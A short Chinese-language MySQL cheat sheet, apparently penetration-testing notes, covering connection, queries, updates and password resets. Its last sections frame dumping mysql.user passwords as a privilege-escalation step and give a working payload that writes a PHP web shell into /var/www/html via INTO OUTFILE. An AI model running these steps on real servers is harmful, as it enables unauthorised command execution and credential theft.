**连接**

sql

```sql
mysql -u root -p  或者mysql -u用户名 -p密码
mysql -h 172.17.0.2 -u root -p
```

**库操作**

sql

```sql
show databases;
use 数据库名;#选择要连接的库
```

**表操作**

sql

```sql
show tables;
describe 表名;
```

**查数据**

sql

```sql
select * from 表名;
select 字段1,字段2 from 表名;
select * from 表名 where 条件;
```

**改数据**

sql

```sql
update 表名 set 字段=值 where 条件;
```

```sql
#改用户密码
update 表名 set 字段=MD5("123456") where 用户名字段=用户名
```

**用户相关（提权常用）**

sql

```sql
select user,password from mysql.user;
select user();       -- 当前用户
select @@datadir;    -- 数据库路径
select @@version;    -- 数据库版本
```

**写文件（有权限时可写 webshell）**

sql

```sql
select "<?php system($_GET['cmd']); ?>" into outfile '/var/www/html/shell.php';
```


